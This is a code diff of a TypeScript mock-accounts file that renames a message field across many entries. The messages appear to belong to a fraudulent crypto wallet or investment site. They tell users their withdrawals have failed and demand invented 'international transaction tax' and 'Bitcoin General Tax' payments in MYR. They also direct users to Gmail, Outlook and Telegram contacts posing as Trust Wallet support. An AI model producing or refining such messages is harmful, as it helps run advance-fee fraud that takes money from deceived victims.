@@ -134,7 +134,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg:
+      errorMsg:
         'Your account has been successfully activated for withdrawals. To learn about your transfer charges, please reach out to our customer care team at smithhelpt2314@gmail.com.',
       transaction_code: '',
       wireDate: true
@@ -260,7 +260,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg:
+      errorMsg:
         'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerservice@outlook.com',
       transaction_code: '',
       wireDate: true
@@ -791,7 +791,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg:
+      errorMsg:
         'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerservice@outlook.com',
       transaction_code: '',
       wireDate: true
@@ -1070,7 +1070,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg:
+      errorMsg:
         'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerrvices@outlook.com',
       transaction_code: '',
       wireDate: true
@@ -1232,7 +1232,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg:
+      errorMsg:
         'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerrvices@outlook.com',
       transaction_code: '',
       wireDate: true
@@ -1412,7 +1412,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'You don’t have enough TRON to cover the network fee. Kindly top up your wallet to continue.',
+      errorMsg: 'You don’t have enough TRON to cover the network fee. Kindly top up your wallet to continue.',
       transaction_code: '',
       wireDate: true
     },
@@ -1534,7 +1534,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
+      errorMsg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
       transaction_code: '',
       wireDate: true
     },
@@ -2093,7 +2093,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: "Withdrawal failed. You don't have enough TRON to cover the network fee. For assistance, please contact our support team via telegram: @ClientHelp247.",
+      errorMsg: "Withdrawal failed. You don't have enough TRON to cover the network fee. For assistance, please contact our support team via telegram: @ClientHelp247.",
       transaction_code: '',
       wireDate: true
     },
@@ -2156,7 +2156,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
+      errorMsg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
       transaction_code: '',
       wireDate: true
     },
@@ -2255,7 +2255,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
+      errorMsg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
       transaction_code: '',
       wireDate: true
     },
@@ -2345,7 +2345,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
+      errorMsg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
       transaction_code: '',
       wireDate: true
     },
@@ -2435,7 +2435,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'Withdrawal failed due to Malaysia government tax requirements of MYR 2,595. Please ensure the required tax amount is paid to proceed.',
+      errorMsg: 'Withdrawal failed due to Malaysia government tax requirements of MYR 2,595. Please ensure the required tax amount is paid to proceed.',
       transaction_code: '',
       wireDate: true
     },
@@ -2579,7 +2579,7 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'You will receive your bitcoin within 24hours but you have to pay the Bitcoin General Tax which is MYR 4,885. Please ensure the required tax amount is paid to proceed.',
+      errorMsg: 'You will receive your bitcoin within 24hours but you have to pay the Bitcoin General Tax which is MYR 4,885. Please ensure the required tax amount is paid to proceed.',
       transaction_code: '',
       wireDate: true
     },
@@ -2752,6 +2752,7 @@ export const mockAccounts: Account[] = [
     holder: {
       full_name: 'Delbert',
       dateCreated: '12/19/2025', // m/d/y
+      dateUpdated: '1/3/2025', // m/d/y
       jointAccount: false,
       email: 'd*@gmail.com',
       username: 'Delbert267',
@@ -2759,7 +2760,9 @@ export const mockAccounts: Account[] = [
     },
     transaction_mgs_code: {
       transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
-      transaction_return_msg: 'Your Transfer is on hold contact this trust wallet agent trustwallettagent@gmail.com.',
+      // errorMsg: 'Your Transfer is on hold contact this trust wallet agent trustwallettagent@gmail.com.',
+      titleSuccessMsg: 'Submitted Successfully',
+      successMsg: 'Withdrawal Application Submitted',
       transaction_code: '',
       wireDate: true
     },
